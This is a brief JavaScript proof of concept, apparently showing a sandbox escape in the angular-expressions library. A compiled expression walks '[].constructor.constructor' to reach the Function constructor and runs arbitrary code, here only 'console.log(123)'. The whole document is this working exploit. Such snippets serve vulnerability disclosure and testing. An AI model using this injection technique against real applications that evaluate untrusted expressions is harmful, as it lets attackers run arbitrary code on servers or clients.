
var expressions = require("angular-expressions");
x = console.log;
evaluate = expressions.compile(`[].constructor.constructor('console.log(123)')()`);
a = evaluate()